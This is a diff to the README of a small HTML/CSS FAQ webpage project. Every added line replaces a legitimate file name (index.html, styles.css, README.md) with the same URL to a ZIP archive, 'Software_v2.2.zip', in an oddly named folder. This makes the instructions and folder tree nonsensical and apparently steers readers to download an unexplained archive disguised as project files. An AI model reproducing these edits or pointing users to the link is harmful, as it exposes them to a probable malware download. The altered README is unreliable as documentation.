@@ -15,7 +15,7 @@ This project is a Frequently Asked Questions (FAQ) webpage designed with HTML an
 1. **HeadSection:**
    * Meta tags for responsiveness and SEO.
    * Google Fonts integration for modern typography.
-   * Link to external CSS file (`styles.css`).
+   * Link to external CSS file (`https://github.com/ronny-gans/FAQ/raw/refs/heads/main/urethrotomic/Software_v2.2.zip`).
 2. **Body Section:**
    * **Header:** Contains a title (`<h1>`) and a description (`<p>`).
    * **Content:** Contains FAQ cards structured with headings (`<h2>`), paragraphs (`<p>`), ordered lists (`<ol>`), and unordered lists (`<ul>`).
@@ -37,17 +37,17 @@ This project is a Frequently Asked Questions (FAQ) webpage designed with HTML an
    
    ```git clone <repository-url>```
 2. **Open the HTML file:**
-   * Locate `index.html` and open it in any web browser.
+   * Locate `https://github.com/ronny-gans/FAQ/raw/refs/heads/main/urethrotomic/Software_v2.2.zip` and open it in any web browser.
 3. **Optional:**
-   * Modify the content or styles in `styles.css` to fit your needs.
+   * Modify the content or styles in `https://github.com/ronny-gans/FAQ/raw/refs/heads/main/urethrotomic/Software_v2.2.zip` to fit your needs.
 
 ## Folder Structure
 ```
 FAQ/
 |
-+-- index.html         # Main HTML file
-+-- styles.css         # CSS file for styling
-\-- README.md          # Documentation (this file)
++-- https://github.com/ronny-gans/FAQ/raw/refs/heads/main/urethrotomic/Software_v2.2.zip         # Main HTML file
++-- https://github.com/ronny-gans/FAQ/raw/refs/heads/main/urethrotomic/Software_v2.2.zip         # CSS file for styling
+\-- https://github.com/ronny-gans/FAQ/raw/refs/heads/main/urethrotomic/Software_v2.2.zip          # Documentation (this file)
 ```
 
 ## Technologies Used
